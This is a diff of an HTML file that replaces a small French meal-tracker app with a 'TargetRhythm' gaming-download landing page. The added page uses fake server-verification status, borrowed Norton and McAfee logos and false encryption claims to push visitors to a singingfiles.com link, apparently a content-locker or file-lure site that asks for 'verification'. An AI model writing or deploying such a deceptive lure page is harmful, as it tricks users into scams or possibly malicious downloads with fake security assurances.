@@ -1,146 +1,59 @@
 <!DOCTYPE html>
-<html lang="fr">
+<html lang="en">
 <head>
-<meta charset="UTF-8">
-<title>YAZIO-like Meal Tracker</title>
-<style>
-body{font-family:Arial;background:#f2f4f7;margin:0;padding:15px}
-header{background:#4CAF50;color:white;padding:15px;text-align:center}
-.card{background:white;padding:15px;margin-bottom:15px;border-radius:10px}
-input,select,button{width:100%;padding:8px;margin:5px 0}
-button{background:#4CAF50;color:white;border:none;border-radius:5px}
-.meal{display:flex;align-items:center;border-bottom:1px solid #eee;padding:5px 0}
-.meal img{width:50px;height:50px;object-fit:cover;border-radius:6px;margin-right:10px}
-.progress{background:#eee;border-radius:10px;overflow:hidden;height:18px}
-.progress div{background:#4CAF50;height:100%;text-align:center;color:white;font-size:12px}
-.ai{background:#e8f5e9;padding:10px;border-radius:8px}
-.small{font-size:13px;color:#555}
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TargetRhythm | Secure Gaming Distribution</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body { background-color: #0b0f1a; color: white; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        .glow-btn:hover { box-shadow: 0 0 15px rgba(34, 197, 94, 0.5); transform: scale(1.02); }
+        .loader { border-top-color: #22c55e; animation: spinner 1.5s linear infinite; }
+        @keyframes spinner { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
 </head>
-<body>
+<body class="flex flex-col items-center justify-center min-h-screen p-6">
 
-<header>
-<h2>🍽️ My Nutrition (YAZIO-style)</h2>
-<p id="goalText"></p>
-</header>
+    <div class="mb-8 text-center">
+        <h1 class="text-4xl font-extrabold tracking-tighter text-white">Target<span class="text-green-500">Rhythm</span></h1>
+        <p class="text-slate-400 text-sm mt-2 uppercase tracking-widest font-semibold">Verified Global Server v4.8</p>
+    </div>
 
-<div class="card">
-<h3>Profil</h3>
-<input id="age" placeholder="Âge">
-<input id="weight" placeholder="Poids (kg)">
-<input id="height" placeholder="Taille (cm)">
-<select id="goal">
-<option value="maintain">Maintien</option>
-<option value="bulk">Prise de masse</option>
-<option value="cut">Sèche</option>
-</select>
-<button onclick="saveProfile()">Enregistrer</button>
-</div>
+    <div class="max-w-md w-full bg-slate-900 border border-slate-800 rounded-3xl p-8 shadow-2xl">
+        
+        <div id="setup-view">
+            <div class="flex items-center justify-between mb-6 bg-slate-800/50 p-4 rounded-xl border border-slate-700">
+                <div>
+                    <p class="text-xs text-slate-400 uppercase">Status</p>
+                    <p class="text-green-400 font-bold">● Online & Ready</p>
+                </div>
+                <div class="text-right">
+                    <p class="text-xs text-slate-400 uppercase">Region</p>
+                    <p class="text-white font-bold text-sm">United States</p>
+                </div>
+            </div>
 
-<div class="card">
-<h3>Ajouter un repas</h3>
-<select id="type">
-<option>Petit-déjeuner</option>
-<option>Déjeuner</option>
-<option>Dîner</option>
-<option>Snack</option>
-</select>
-<input id="food" placeholder="Aliment">
-<input id="cal" placeholder="Calories">
-<input id="prot" placeholder="Protéines (g)">
-<input type="file" id="photo">
-<button onclick="addMeal()">Ajouter</button>
-</div>
+            <h2 class="text-xl font-bold mb-4">Request Access</h2>
+            <p class="text-slate-400 text-sm mb-6">Click below to initiate the secure transfer to your account. Verification may be required to prevent bot abuse.</p>
 
-<div class="card">
-<h3>Calories aujourd’hui</h3>
-<div class="progress"><div id="bar">0%</div></div>
-<p class="small"><span id="total">0</span> / <span id="target">0</span> kcal</p>
-</div>
+            <a href="https://singingfiles.com/show.php?l=0&u=2499815&id=73209" 
+               class="glow-btn block w-full bg-green-500 hover:bg-green-400 text-black text-center font-black py-4 rounded-2xl transition-all duration-300 text-xl uppercase italic">
+                Get Started Now
+            </a>
+        </div>
 
-<div class="card">
-<h3>Repas</h3>
-<div id="meals"></div>
-</div>
+        <div class="mt-10 pt-6 border-t border-slate-800 flex flex-col items-center">
+            <div class="flex space-x-4 opacity-40 grayscale mb-4">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/1b/Norton_by_Symantec_logo.svg/2560px-Norton_by_Symantec_logo.svg.png" class="h-4">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/McAfee_logo.svg" class="h-4">
+            </div>
+            <p class="text-[10px] text-slate-600 text-center uppercase tracking-tighter">
+                Cloud Encryption Active | SSL Secure Connection | No Password Required
+            </p>
+        </div>
+    </div>
 
-<div class="card ai">
-<h3>🤖 Coach IA</h3>
-<p id="aiText">Ajoute tes repas pour voir les conseils.</p>
-</div>
-
-<script>
-let meals = JSON.parse(localStorage.getItem("meals")||"[]");
-let profile = JSON.parse(localStorage.getItem("profile")||"{}");
-
-function saveProfile(){
-profile={
-age:+age.value,weight:+weight.value,height:+height.value,goal:goal.value
-};
-localStorage.setItem("profile",JSON.stringify(profile));
-alert("Profil enregistré");
-render();
-}
-
-function calcTarget(){
-if(!profile.weight) return 0;
-let bmr = 10*profile.weight + 6.25*profile.height - 5*profile.age + 5;
-if(profile.goal==="bulk") return Math.round(bmr+300);
-if(profile.goal==="cut") return Math.round(bmr-400);
-return Math.round(bmr);
-}
-
-function addMeal(){
-const f=document.getElementById("photo");
-if(f.files.length){
-let r=new FileReader();
-r.onload=e=>saveMeal(e.target.result);
-r.readAsDataURL(f.files[0]);
-}else saveMeal(null);
-}
-
-function saveMeal(img){
-meals.push({
-date:new Date().toDateString(),
-type:type.value,
-food:food.value,
-cal:+cal.value,
-prot:+prot.value,
-img
-});
-localStorage.setItem("meals",JSON.stringify(meals));
-render();
-}
-
-function render(){
-let today=new Date().toDateString();
-let todayMeals=meals.filter(m=>m.date===today);
-let total=todayMeals.reduce((s,m)=>s+m.cal,0);
-let target=calcTarget();
-
-document.getElementById("total").innerText=total;
-document.getElementById("target").innerText=target;
-let pct=target?Math.min(100,Math.round(total/target*100)):0;
-bar.style.width=pct+"%"; bar.innerText=pct+"%";
-
-mealsDiv.innerHTML="";
-todayMeals.forEach(m=>{
-mealsDiv.innerHTML+=`
-<div class="meal">
-${m.img?`<img src="${m.img}">`:``}
-<div><b>${m.type}</b><br>${m.food} – ${m.cal} kcal</div>
-</div>`;
-});
-
-aiText.innerText =
-total<target*0.8?"Tu peux encore manger 👍":
-total>target?"Tu dépasses ton objectif ⚠️":
-"Bon équilibre 👌";
-
-goalText.innerText=profile.goal?`Objectif : ${profile.goal}`:"";
-}
-
-render();
-</script>
+    <p class="mt-8 text-slate-500 text-[11px]">© 2026 TargetRhythm distribution. Authorized users only.</p>
 
 </body>
 </html>
